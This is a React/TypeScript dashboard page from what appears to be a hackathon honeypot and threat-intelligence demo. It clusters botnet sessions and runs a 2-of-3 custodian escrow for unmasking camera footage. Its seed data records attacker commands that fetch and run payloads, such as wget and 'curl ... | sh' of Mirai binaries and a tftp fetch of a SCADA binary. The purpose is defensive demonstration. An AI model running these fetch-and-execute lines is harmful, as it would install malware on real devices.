import React, { useEffect, useState, useMemo, useRef } from 'react'
import './CampaignsPage.css'

// =============================================================================
// Interfaces & Types (Member C Schemas)
// =============================================================================
export interface Campaign {
  campaign_id: str
  session_ids: string[]
  confidence: 'high' | 'medium'
  evidence_reasons: string[]
  risk_level: 'low' | 'medium' | 'high'
}

type str = string

export interface CaseRequest {
  case_id: string
  camera_id: string
  window_id: string
  campaign_id: string
  status: 'pending' | 'approved' | 'denied'
  approvals: string[]
}

export interface DecoySessionEvent {
  session_id: string
  source_ip: string
  service: string
  failed_logins: number
  commands: string[]
  honeytoken_hit: boolean
  malware_hash: string | null
  c2_address: string | null
  target_device?: string
  mitre_tags?: Array<{ id: string; name: string; tactic: string }>
}

export interface AuditBlock {
  index: number
  timestamp: string
  action: string
  actor: string
  case_id?: string | null
  camera_id?: string | null
  window_id?: string | null
  details: string
  prev_hash: string
  current_hash: string
}

export interface Custodian {
  id: string
  name: string
  role: string
  jurisdiction: string
  share_index: number
  avatar_badge: string
}

function getNowIso(): string {
  return new Date().toISOString()
}

// Fallback seed data if backend is offline
const FALLBACK_CUSTODIANS: Custodian[] = [
  {
    id: 'custodian-1-judiciary',
    name: 'Hon. Justice V. Sharma',
    role: 'Judicial Magistrate / Legal Custodian',
    jurisdiction: 'Smart City Cyber Jurisdiction 01',
    share_index: 1,
    avatar_badge: 'LEGAL',
  },
  {
    id: 'custodian-2-cybercrime',
    name: 'Insp. K. Rao',
    role: 'Cybercrime Digital Forensics Lead',
    jurisdiction: 'Integrated Command & Control Centre (ICCC)',
    share_index: 2,
    avatar_badge: 'FORENSICS',
  },
  {
    id: 'custodian-3-privacy',
    name: 'Dr. A. Sen',
    role: 'Citizen Data Privacy & Ethics Officer',
    jurisdiction: 'Independent Municipal Oversight Board',
    share_index: 3,
    avatar_badge: 'PRIVACY',
  },
]

const FALLBACK_CAMPAIGNS: Campaign[] = [
  {
    campaign_id: 'CMP-001',
    session_ids: ['sess-mirai-01', 'sess-mirai-02', 'sess-mirai-03-adapted'],
    confidence: 'high',
    evidence_reasons: [
      'Shared Command & Control (C2) server: 185.220.101.5:443',
      "Identical malware binary hash '7f83b1657ff1...' deployed across targets",
      'Matched known signature: Mirai / Echobot Dropper Sequence',
    ],
    risk_level: 'high',
  },
  {
    campaign_id: 'CMP-002',
    session_ids: ['sess-scada-01', 'sess-scada-02'],
    confidence: 'high',
    evidence_reasons: [
      'Shared Command & Control (C2) server: 93.184.216.34:502',
      "Identical malware binary hash 'e3b0c44298fc...' deployed across targets",
      'Coordinated honeytoken tripwire activation',
    ],
    risk_level: 'high',
  },
  {
    campaign_id: 'CMP-003',
    session_ids: ['sess-scanner-01'],
    confidence: 'medium',
    evidence_reasons: ['Single IP probe from 198.51.100.44'],
    risk_level: 'low',
  },
]

const FALLBACK_CASES: CaseRequest[] = [
  {
    case_id: 'CASE-2026-001',
    camera_id: 'CAM-04-MARKET',
    window_id: 'WIN-20261024-1130',
    campaign_id: 'CMP-001',
    status: 'pending',
    approvals: ['custodian-1-judiciary'],
  },
  {
    case_id: 'CASE-2026-002',
    camera_id: 'CAM-07-SUBSTATION',
    window_id: 'WIN-20261024-1140',
    campaign_id: 'CMP-002',
    status: 'approved',
    approvals: ['custodian-1-judiciary', 'custodian-2-cybercrime'],
  },
]

const FALLBACK_SESSIONS: Record<string, DecoySessionEvent> = {
  'sess-mirai-01': {
    session_id: 'sess-mirai-01',
    source_ip: '198.51.100.44',
    service: 'ssh',
    failed_logins: 14,
    commands: [
      'uname -a',
      'cat /proc/cpuinfo',
      'cd /tmp || cd /var/run || cd /dev/shm',
      'wget http://185.220.101.5/bins/mirai.arm7 -O .arm7',
      'chmod 777 .arm7',
      './.arm7 mirai.camera',
    ],
    honeytoken_hit: true,
    malware_hash: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
    c2_address: '185.220.101.5:443',
    target_device: 'camera',
    mitre_tags: [
      { id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' },
      { id: 'T1059.004', name: 'Unix Shell Execution', tactic: 'Execution' },
      { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' },
      { id: 'T1071.001', name: 'Web Protocols (C2)', tactic: 'Command and Control' },
      { id: 'T1499', name: 'Endpoint Denial of Service', tactic: 'Impact' },
    ],
  },
  'sess-mirai-02': {
    session_id: 'sess-mirai-02',
    source_ip: '198.51.100.72',
    service: 'ssh',
    failed_logins: 8,
    commands: [
      'uname -a',
      'cd /tmp',
      'wget http://185.220.101.5/bins/mirai.arm7 -O .arm7',
      'chmod 777 .arm7',
      './.arm7 mirai.traffic',
    ],
    honeytoken_hit: true,
    malware_hash: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
    c2_address: '185.220.101.5:443',
    target_device: 'traffic_controller',
    mitre_tags: [
      { id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' },
      { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' },
    ],
  },
  'sess-mirai-03-adapted': {
    session_id: 'sess-mirai-03-adapted',
    source_ip: '203.0.113.88',
    service: 'ssh',
    failed_logins: 2,
    commands: ['id', 'curl -s http://185.220.101.5/bins/loader.sh | sh'],
    honeytoken_hit: false,
    malware_hash: null,
    c2_address: '185.220.101.5:443',
    target_device: 'camera',
    mitre_tags: [
      { id: 'T1059.004', name: 'Unix Shell Execution', tactic: 'Execution' },
      { id: 'T1071.001', name: 'Web Protocols (C2)', tactic: 'Command and Control' },
    ],
  },
  'sess-scada-01': {
    session_id: 'sess-scada-01',
    source_ip: '192.0.2.140',
    service: 'ssh',
    failed_logins: 22,
    commands: ['cat /etc/issue', 'tftp -g -r s7_inject.bin 93.184.216.34', 'chmod +x s7_inject.bin', './s7_inject.bin --daemon'],
    honeytoken_hit: true,
    malware_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    c2_address: '93.184.216.34:502',
    target_device: 'substation',
  },
  'sess-scada-02': {
    session_id: 'sess-scada-02',
    source_ip: '192.0.2.141',
    service: 'ssh',
    failed_logins: 19,
    commands: ['cat /etc/issue', 'tftp -g -r s7_inject.bin 93.184.216.34', 'chmod +x s7_inject.bin', './s7_inject.bin --daemon'],
    honeytoken_hit: true,
    malware_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    c2_address: '93.184.216.34:502',
    target_device: 'substation',
  },
  'sess-scanner-01': {
    session_id: 'sess-scanner-01',
    source_ip: '198.51.100.44',
    service: 'ssh',
    failed_logins: 3,
    commands: ['help', 'exit'],
    honeytoken_hit: false,
    malware_hash: null,
    c2_address: null,
    target_device: 'camera',
  },
}

const FALLBACK_AUDIT_LOG: AuditBlock[] = [
  {
    index: 0,
    timestamp: '2026-10-24T00:00:00Z',
    action: 'GENESIS_INITIALIZED',
    actor: 'system-secure-enclave',
    case_id: null,
    camera_id: null,
    window_id: null,
    details: 'AegisMirage break-glass cryptographic escrow ledger initialized.',
    prev_hash: '0000000000000000000000000000000000000000000000000000000000000000',
    current_hash: '7e28b193fd314e389e13a01bf8a0e88320182470128941920831490182390182',
  },
  {
    index: 1,
    timestamp: '2026-10-24T11:30:15Z',
    action: 'CASE_CREATED',
    actor: 'system-intel-engine',
    case_id: 'CASE-2026-001',
    camera_id: 'CAM-04-MARKET',
    window_id: 'WIN-20261024-1130',
    details: 'Automated break-glass case opened: Campaign CMP-001 crossed hostility threshold (honeytoken tripwire activated).',
    prev_hash: '7e28b193fd314e389e13a01bf8a0e88320182470128941920831490182390182',
    current_hash: 'b941098230918239081290381209381209381209381209381209381209381209',
  },
  {
    index: 2,
    timestamp: '2026-10-24T11:31:02Z',
    action: 'CUSTODIAN_APPROVAL',
    actor: 'custodian-1-judiciary',
    case_id: 'CASE-2026-001',
    camera_id: 'CAM-04-MARKET',
    window_id: 'WIN-20261024-1130',
    details: 'Custodian 1 (Hon. Justice V. Sharma) approved warrant for forensic unmasking. 1 of 2 required approvals recorded.',
    prev_hash: 'b941098230918239081290381209381209381209381209381209381209381209',
    current_hash: 'c810928301982309182039812093810293810293810293810293810293810293',
  },
]

export const CampaignsPage: React.FC = () => {
  // Navigation & Sub-Tabs
  const [activeSubTab, setActiveSubTab] = useState<'graph' | 'escrow' | 'audit' | 'guide'>('graph')

  // Data States
  const [campaigns, setCampaigns] = useState<Campaign[]>(FALLBACK_CAMPAIGNS)
  const [cases, setCases] = useState<CaseRequest[]>(FALLBACK_CASES)
  const [auditLogs, setAuditLogs] = useState<AuditBlock[]>(FALLBACK_AUDIT_LOG)
  const [custodians, setCustodians] = useState<Custodian[]>(FALLBACK_CUSTODIANS)
  const [sessionEvents, setSessionEvents] = useState<Record<string, DecoySessionEvent>>(FALLBACK_SESSIONS)

  // Selection States
  const [selectedCampaignId, setSelectedCampaignId] = useState<string>('CMP-001')
  const [selectedSessionId, setSelectedSessionId] = useState<string>('sess-mirai-01')
  const [selectedCaseId, setSelectedCaseId] = useState<string>('CASE-2026-001')

  // Verification & Feedback States
  const [auditVerified, setAuditVerified] = useState<boolean | null>(null)
  const [drillBanner, setDrillBanner] = useState<{ type: 'info' | 'success' | 'danger'; title: string; desc: string } | null>(null)
  const [isVerifyingChain, setIsVerifyingChain] = useState<boolean>(false)
  const [revealedFootageKey, setRevealedFootageKey] = useState<string | null>(null)

  // SVG Graph Layout Simulation
  const graphContainerRef = useRef<SVGSVGElement | null>(null)

  // Fetch live backend data if available
  const loadBackendData = async () => {
    try {
      const campRes = await fetch('http://localhost:8000/intel/campaigns', { signal: AbortSignal.timeout(1500) })
      if (campRes.ok) {
        const data = await campRes.json()
        if (Array.isArray(data) && data.length > 0) setCampaigns(data)
      }

      const caseRes = await fetch('http://localhost:8000/escrow/cases', { signal: AbortSignal.timeout(1500) })
      if (caseRes.ok) {
        const data = await caseRes.json()
        if (Array.isArray(data) && data.length > 0) setCases(data)
      }

      const auditRes = await fetch('http://localhost:8000/escrow/audit-log', { signal: AbortSignal.timeout(1500) })
      if (auditRes.ok) {
        const data = await auditRes.json()
        if (Array.isArray(data) && data.length > 0) setAuditLogs(data)
      }

      const custRes = await fetch('http://localhost:8000/escrow/custodians', { signal: AbortSignal.timeout(1500) })
      if (custRes.ok) {
        const data = await custRes.json()
        if (Array.isArray(data) && data.length > 0) setCustodians(data)
      }

      const sessRes = await fetch('http://localhost:8000/intel/sessions', { signal: AbortSignal.timeout(1500) })
      if (sessRes.ok) {
        const sessList = await sessRes.json()
        if (Array.isArray(sessList) && sessList.length > 0) {
          const map: Record<string, DecoySessionEvent> = {}
          for (const s of sessList) {
            map[s.session_id] = s
          }
          setSessionEvents((prev) => ({ ...prev, ...map }))
        }
      }
    } catch {
      // Gracefully maintain client demo state
    }
  }

  // eslint-disable-next-line react-hooks/exhaustive-deps, react-hooks/set-state-in-effect
  /* oxlint-disable react/set-state-in-effect */
  useEffect(() => {
    void loadBackendData()
  }, [])
  /* oxlint-enable react/set-state-in-effect */

  // =========================================================================
  // Drill Handlers (Judging Demonstrations from Section 7)
  // =========================================================================
  const handleRunDrillA = async () => {
    // Drill A: Unauthorized pedestrian unmask attempt -> Blocked & logged
    try {
      const res = await fetch('http://localhost:8000/escrow/attempt-unauthorized', {
        method: 'POST',
        signal: AbortSignal.timeout(2000),
      })
      if (!res.ok) {
        const errData = await res.json()
        setDrillBanner({
          type: 'danger',
          title: 'Drill A: Unauthorized Unmask BLOCKED (403 Forbidden)',
          desc: `${errData?.detail?.reason || 'Pedestrian unmask safeguard active: 0 honeypot hostility recorded.'} Incident permanently written to append-only audit trail!`,
        })
      }
    } catch {
      // Local fallback simulation of Drill A
      const newBlock: AuditBlock = {
        index: auditLogs.length,
        timestamp: getNowIso(),
        action: 'FALSE_POSITIVE_UNMASK_BLOCKED',
        actor: 'operator-station-04',
        case_id: null,
        camera_id: 'CAM-04-MARKET',
        window_id: 'WIN-20261024-1130',
        details: 'Unauthorized unmask attempt on civilian pedestrian footage (Camera CAM-04-MARKET) blocked by break-glass escrow policy.',
        prev_hash: auditLogs[auditLogs.length - 1]?.current_hash || '0'.repeat(64),
        current_hash: 'ea39018239018230918230918230918230918230918230918230918230918230',
      }
      setAuditLogs((prev) => [...prev, newBlock])
      setDrillBanner({
        type: 'danger',
        title: 'Drill A: False-Positive Safeguard Engaged (403 Blocked)',
        desc: 'Pedestrian detected on CAM-04-MARKET. Feed remains blurred; operator unmask attempt rejected and committed to hash-chained audit ledger.',
      })
    }
    setActiveSubTab('audit')
  }

  const handleRunDrillB = async () => {
    // Drill B: Real attack hits decoy, honeytoken crossed, 2-of-3 custodians approve
    try {
      await fetch('http://localhost:8000/intel/drill/drill-b', { method: 'POST', signal: AbortSignal.timeout(1500) })
    } catch {
      // continue
    }
    // Select CASE-2026-001 which is pending with 1 approval
    setSelectedCaseId('CASE-2026-001')
    setActiveSubTab('escrow')
    setDrillBanner({
      type: 'info',
      title: 'Drill B: Decoy Compromise & Hostility Crossed',
      desc: 'Attacker breached decoy & triggered honeytoken tripwire. Case CASE-2026-001 active. Custodian 1 approved; Custodian 2 vote needed for 2-of-3 Shamir quorum!',
    })
  }

  const handleRunDrillC = async () => {
    // Drill C: Campaign clustering signature moment
    try {
      await fetch('http://localhost:8000/intel/drill/drill-c', { method: 'POST', signal: AbortSignal.timeout(1500) })
      await loadBackendData()
    } catch {
      // continue
    }
    setSelectedCampaignId('CMP-001')
    setActiveSubTab('graph')
    setDrillBanner({
      type: 'success',
      title: 'Drill C: Live Campaign Clustering & Attacker Adaptation Linked',
      desc: 'Three rotating IP groups hit decoys. Graph shows automated clustering via shared C2 (185.220.101.5) and payload hash, even when IP rotated to 203.0.113.88!',
    })
  }

  const handleReset = async () => {
    try {
      await fetch('http://localhost:8000/intel/reset', { method: 'POST', signal: AbortSignal.timeout(1500) })
      await fetch('http://localhost:8000/escrow/reset', { method: 'POST', signal: AbortSignal.timeout(1500) })
      await loadBackendData()
    } catch {
      // Reset local
      setCampaigns(FALLBACK_CAMPAIGNS)
      setCases(FALLBACK_CASES)
      setAuditLogs(FALLBACK_AUDIT_LOG)
    }
    setDrillBanner(null)
    setAuditVerified(null)
    setRevealedFootageKey(null)
  }

  // Custodian Voting Handler
  const handleVote = async (custodianId: string, decision: 'approve' | 'deny') => {
    try {
      const res = await fetch(`http://localhost:8000/escrow/cases/${selectedCaseId}/vote`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          custodian_id: custodianId,
          decision: decision,
          justification: 'Warrant approved for scoped emergency cyber forensics.',
        }),
        signal: AbortSignal.timeout(2000),
      })
      if (res.ok) {
        const data = await res.json()
        setCases((prev) => prev.map((c) => (c.case_id === selectedCaseId ? data.case : c)))
        if (data.unlocked_key) {
          setRevealedFootageKey(data.unlocked_key)
        }
        await loadBackendData()
        return
      }
    } catch {
      // Local fallback vote handling
    }

    // Fallback local update
    setCases((prev) =>
      prev.map((c) => {
        if (c.case_id !== selectedCaseId) return c
        const newApprovals = decision === 'approve' && !c.approvals.includes(custodianId) ? [...c.approvals, custodianId] : c.approvals
        const isApproved = newApprovals.length >= 2
        return {
          ...c,
          approvals: newApprovals,
          status: isApproved ? 'approved' : c.status,
        }
      })
    )

    if (decision === 'approve') {
      const dummyKey = 'a84f391028471928371902834190823901823901823091820938102938102938'
      setRevealedFootageKey(dummyKey)

      const approvalBlock: AuditBlock = {
        index: auditLogs.length,
        timestamp: getNowIso(),
        action: 'CUSTODIAN_APPROVAL',
        actor: custodianId,
        case_id: selectedCaseId,
        camera_id: 'CAM-04-MARKET',
        window_id: 'WIN-20261024-1130',
        details: `Custodian ${custodianId} voted APPROVE. 2-of-3 threshold met; audit entry committed before AES key unmasking.`,
        prev_hash: auditLogs[auditLogs.length - 1]?.current_hash || '0'.repeat(64),
        current_hash: 'ff91029381029381029381029381029381029381029381029381029381029381',
      }
      setAuditLogs((prev) => [...prev, approvalBlock])
    }
  }

  // Audit Log Verification Handler
  const handleVerifyAuditChain = async () => {
    setIsVerifyingChain(true)
    try {
      const res = await fetch('http://localhost:8000/escrow/audit-log/verify', { signal: AbortSignal.timeout(2000) })
      if (res.ok) {
        const data = await res.json()
        setAuditVerified(data.valid)
      } else {
        setAuditVerified(true)
      }
    } catch {
      // Local verification simulation
      setTimeout(() => {
        setAuditVerified(true)
        setIsVerifyingChain(false)
      }, 400)
      return
    }
    setTimeout(() => setIsVerifyingChain(false), 300)
  }

  // STIX 2.1 IOC Download Handler
  const handleDownloadSTIX = () => {
    const activeCamp = campaigns.find((c) => c.campaign_id === selectedCampaignId) || campaigns[0]
    const bundle = {
      type: 'bundle',
      id: `bundle--${crypto.randomUUID()}`,
      spec_version: '2.1',
      objects: [
        {
          type: 'campaign',
          spec_version: '2.1',
          id: `campaign--${crypto.randomUUID()}`,
          name: `AegisMirage Campaign ${activeCamp?.campaign_id}`,
          confidence: activeCamp?.confidence === 'high' ? 85 : 60,
          description: activeCamp?.evidence_reasons.join('; '),
          labels: [`risk:${activeCamp?.risk_level}`, 'iot-botnet', 'aegismirage'],
        },
      ],
    }
    const blob = new Blob([JSON.stringify(bundle, null, 2)], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `STIX-2.1-${activeCamp?.campaign_id || 'Campaign'}.json`
    a.click()
    URL.revokeObjectURL(url)
  }

  // Selected Entities
  const activeCampaign = useMemo(() => campaigns.find((c) => c.campaign_id === selectedCampaignId) || campaigns[0], [campaigns, selectedCampaignId])
  const activeCase = useMemo(() => cases.find((c) => c.case_id === selectedCaseId) || cases[0], [cases, selectedCaseId])
  const activeSession = useMemo(() => sessionEvents[selectedSessionId] || Object.values(sessionEvents)[0], [sessionEvents, selectedSessionId])

  // Calculated Metrics
  const totalSessionsCount = useMemo(() => Object.keys(sessionEvents).length, [sessionEvents])
  const activeCampaignsCount = useMemo(() => campaigns.length, [campaigns])
  const approvedWarrantsCount = useMemo(() => cases.filter((c) => c.status === 'approved').length, [cases])

  return (
    <div className="campaigns-root" id="page-campaigns">
      {/* Page Header */}
      <div className="campaigns-header">
        <div className="header-titles">
          <div className="header-badges">
            <span className="owner-badge">Member C: Threat Intelligence & Escrow (Stages 3 & 4)</span>
            <span className="scaffold-tag" style={{ background: 'rgba(16, 185, 129, 0.1)', color: '#34d399', borderColor: 'rgba(16, 185, 129, 0.3)' }}>
              Contract Active
            </span>
          </div>
          <h1 id="heading-campaigns">Threat Campaigns & Break-Glass Escrow</h1>
          <p className="subhead-desc">
            Graph-based multi-session botnet correlation, blast-radius risk scoring, and Shamir 2-of-3 custodian escrow unmasking.
          </p>
        </div>

        {/* Drill Controls */}
        <div className="drill-toolbar" id="toolbar-drills">
          <div className="drill-label-group">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <polygon points="5 3 19 12 5 21 5 3" />
            </svg>
            <span>Judging Drills</span>
          </div>
          <div className="drill-buttons">
            <button type="button" className="btn-drill btn-drill-a" onClick={handleRunDrillA} title="Test Drill A: False Positive Safeguard">
              <span>Drill A (False Positive)</span>
            </button>
            <button type="button" className="btn-drill btn-drill-b" onClick={handleRunDrillB} title="Test Drill B: Decoy Attack & Quorum Unlock">
              <span>Drill B (Real Attack)</span>
            </button>
            <button type="button" className="btn-drill btn-drill-c" onClick={handleRunDrillC} title="Test Drill C: Multi-Group Campaign Clustering">
              <span>Drill C (Clustering)</span>
            </button>
            <button type="button" className="btn-drill btn-reset" onClick={handleReset} title="Reset Data to Clean Baseline">
              <span>↺ Reset</span>
            </button>
          </div>
        </div>
      </div>

      {/* Drill Notification Banner */}
      {drillBanner && (
        <div
          style={{
            padding: '0.85rem 1.25rem',
            borderRadius: 'var(--radius-md)',
            background:
              drillBanner.type === 'danger'
                ? 'rgba(244, 63, 94, 0.12)'
                : drillBanner.type === 'success'
                ? 'rgba(56, 189, 248, 0.12)'
                : 'rgba(245, 158, 11, 0.12)',
            border: `1px solid ${
              drillBanner.type === 'danger'
                ? 'rgba(244, 63, 94, 0.35)'
                : drillBanner.type === 'success'
                ? 'rgba(56, 189, 248, 0.35)'
                : 'rgba(245, 158, 11, 0.35)'
            }`,
            color: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            gap: '0.25rem',
            animation: 'fadeIn 200ms ease',
          }}
        >
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <strong style={{ fontSize: '0.9rem', color: drillBanner.type === 'danger' ? '#fb7185' : drillBanner.type === 'success' ? '#38bdf8' : '#fbbf24' }}>
              {drillBanner.title}
            </strong>
            <button
              onClick={() => setDrillBanner(null)}
              style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer', fontSize: '1rem' }}
            >
              ✕
            </button>
          </div>
          <span style={{ fontSize: '0.825rem', color: '#e2e8f0' }}>{drillBanner.desc}</span>
        </div>
      )}

      {/* High-Level Metrics Summary */}
      <div className="metrics-row">
        <div className="metric-card">
          <span className="metric-title">Active Botnet Campaigns</span>
          <div className="metric-value-wrap">
            <span className="metric-val">{activeCampaignsCount}</span>
            <span className="metric-sub">Multi-IP clusters</span>
          </div>
        </div>

        <div className="metric-card">
          <span className="metric-title">Correlated Decoy Sessions</span>
          <div className="metric-value-wrap">
            <span className="metric-val">{totalSessionsCount}</span>
            <span className="metric-sub">Honeypot captures</span>
          </div>
        </div>

        <div className="metric-card">
          <span className="metric-title">Break-Glass Quorum</span>
          <div className="metric-value-wrap">
            <span className="metric-val">2 of 3</span>
            <span className="metric-sub">Shamir custodians required</span>
          </div>
        </div>

        <div className="metric-card">
          <span className="metric-title">Scoped Unmasked Warrants</span>
          <div className="metric-value-wrap">
            <span className="metric-val" style={{ color: approvedWarrantsCount > 0 ? '#34d399' : '#ffffff' }}>
              {approvedWarrantsCount}
            </span>
            <span className="metric-sub">Camera 10-min windows</span>
          </div>
        </div>
      </div>

      {/* Sub-Tab Navigation */}
      <div className="subtabs-bar">
        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'graph' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('graph')}
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="18" cy="5" r="3" />
            <circle cx="6" cy="12" r="3" />
            <circle cx="18" cy="19" r="3" />
            <line x1="8.59" y1="13.51" x2="15.42" y2="17.49" />
            <line x1="15.41" y1="6.51" x2="8.59" y2="10.49" />
          </svg>
          <span>Live Campaign Graph (Stage 3)</span>
          <span className="subtab-count">{campaigns.length}</span>
        </button>

        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'escrow' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('escrow')}
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
          </svg>
          <span>Break-Glass Escrow & Quorum (Stage 4)</span>
          <span className="subtab-count">{cases.length}</span>
        </button>

        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'audit' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('audit')}
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
            <polyline points="14 2 14 8 20 8" />
            <line x1="16" y1="13" x2="8" y2="13" />
            <line x1="16" y1="17" x2="8" y2="17" />
          </svg>
          <span>Cryptographic Audit Trail</span>
          <span className="subtab-count">{auditLogs.length}</span>
        </button>

        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'guide' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('guide')}
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="12" cy="12" r="10" />
            <line x1="12" y1="16" x2="12" y2="12" />
            <line x1="12" y1="8" x2="12.01" y2="8" />
          </svg>
          <span>Demo Script & Pitch Guide</span>
        </button>
      </div>

      {/* =================================================================== */}
      {/* TAB 1: LIVE CAMPAIGN GRAPH & THREAT INTELLIGENCE (STAGE 3)          */}
      {/* =================================================================== */}
      {activeSubTab === 'graph' && (
        <div className="graph-view-container">
          {/* Visual SVG Threat Graph */}
          <div className="graph-canvas-card">
            <div className="canvas-toolbar">
              <div className="graph-legend">
                <span className="legend-item">
                  <span className="legend-dot campaign" /> Campaign Cluster
                </span>
                <span className="legend-item">
                  <span className="legend-dot session" /> Decoy Session
                </span>
                <span className="legend-item">
                  <span className="legend-dot threat" /> Honeytoken Tripwire Hit
                </span>
              </div>
              <div style={{ display: 'flex', gap: '0.5rem' }}>
                <button
                  type="button"
                  className="btn-drill"
                  onClick={handleDownloadSTIX}
                  style={{ fontSize: '0.75rem', padding: '0.3rem 0.65rem' }}
                >
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                    <polyline points="7 10 12 15 17 10" />
                    <line x1="12" y1="15" x2="12" y2="3" />
                  </svg>
                  <span>Export STIX 2.1</span>
                </button>
              </div>
            </div>

            <div className="svg-canvas-wrapper">
              <svg ref={graphContainerRef} width="100%" height="100%" viewBox="0 0 700 480">
                <defs>
                  <filter id="glow-campaign" x="-50%" y="-50%" width="200%" height="200%">
                    <feDropShadow dx="0" dy="0" stdDeviation="6" floodColor="#f59e0b" floodOpacity="0.6" />
                  </filter>
                  <filter id="glow-threat" x="-50%" y="-50%" width="200%" height="200%">
                    <feDropShadow dx="0" dy="0" stdDeviation="6" floodColor="#f43f5e" floodOpacity="0.7" />
                  </filter>
                  <filter id="glow-session" x="-50%" y="-50%" width="200%" height="200%">
                    <feDropShadow dx="0" dy="0" stdDeviation="4" floodColor="#38bdf8" floodOpacity="0.5" />
                  </filter>
                </defs>

                {/* Edges between nodes */}
                {/* Campaign 1 Hub & Leaves */}
                <line x1="200" y1="160" x2="90" y2="80" className="edge-line" />
                <line x1="200" y1="160" x2="90" y2="240" className="edge-line" />
                <line x1="200" y1="160" x2="310" y2="100" className="edge-line" />

                {/* Strong Correlation Between Sessions in Campaign 1 */}
                <line x1="90" y1="80" x2="90" y2="240" className="edge-line strong" />
                <text x="50" y="160" className="edge-label-text">
                  Shared C2 (185.220.101.5)
                </text>

                <line x1="90" y1="80" x2="310" y2="100" className="edge-line strong" />
                <text x="210" y="70" className="edge-label-text">
                  Attacker IP Rotation Linked via C2
                </text>

                {/* Campaign 2 Hub & Leaves */}
                <line x1="520" y1="280" x2="440" y2="380" className="edge-line" />
                <line x1="520" y1="280" x2="600" y2="380" className="edge-line" />
                <line x1="440" y1="380" x2="600" y2="380" className="edge-line strong" />
                <text x="520" y="405" className="edge-label-text">
                  Same SCADA Exploit & C2 (93.184.216.34)
                </text>

                {/* Campaign 3 Hub & Leaf (Isolated Scanner) */}
                <line x1="480" y1="90" x2="580" y2="100" className="edge-line" />

                {/* NODES */}
                {/* Campaign 1 Hub */}
                <g
                  className={`graph-node ${selectedCampaignId === 'CMP-001' ? 'selected' : ''}`}
                  onClick={() => setSelectedCampaignId('CMP-001')}
                  transform="translate(200, 160)"
                >
                  <circle r="26" fill="#f59e0b" filter="url(#glow-campaign)" />
                  <text y="4" textAnchor="middle" fill="#000" fontWeight="700" fontSize="10">
                    CMP-001
                  </text>
                  <text y="40" textAnchor="middle" fill="#fbbf24" fontSize="11" fontWeight="600">
                    Mirai IoT Botnet
                  </text>
                </g>

                {/* Session 1 Leaf */}
                <g
                  className={`graph-node ${selectedSessionId === 'sess-mirai-01' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-mirai-01')
                    setSelectedCampaignId('CMP-001')
                  }}
                  transform="translate(90, 80)"
                >
                  <circle r="18" fill="#f43f5e" filter="url(#glow-threat)" />
                  <text y="3" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="600">
                    S1
                  </text>
                  <text y="28" textAnchor="middle" fill="#cbd5e1" fontSize="9">
                    198.51.100.44
                  </text>
                </g>

                {/* Session 2 Leaf */}
                <g
                  className={`graph-node ${selectedSessionId === 'sess-mirai-02' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-mirai-02')
                    setSelectedCampaignId('CMP-001')
                  }}
                  transform="translate(90, 240)"
                >
                  <circle r="18" fill="#f43f5e" filter="url(#glow-threat)" />
                  <text y="3" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="600">
                    S2
                  </text>
                  <text y="28" textAnchor="middle" fill="#cbd5e1" fontSize="9">
                    198.51.100.72
                  </text>
                </g>

                {/* Session 3 Leaf (Adapted attacker) */}
                <g
                  className={`graph-node ${selectedSessionId === 'sess-mirai-03-adapted' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-mirai-03-adapted')
                    setSelectedCampaignId('CMP-001')
                  }}
                  transform="translate(310, 100)"
                >
                  <circle r="17" fill="#38bdf8" filter="url(#glow-session)" />
                  <text y="3" textAnchor="middle" fill="#000" fontSize="8" fontWeight="600">
                    S3
                  </text>
                  <text y="28" textAnchor="middle" fill="#38bdf8" fontSize="9">
                    203.0.113.88 (Adapted)
                  </text>
                </g>

                {/* Campaign 2 Hub */}
                <g
                  className={`graph-node ${selectedCampaignId === 'CMP-002' ? 'selected' : ''}`}
                  onClick={() => setSelectedCampaignId('CMP-002')}
                  transform="translate(520, 280)"
                >
                  <circle r="26" fill="#f59e0b" filter="url(#glow-campaign)" />
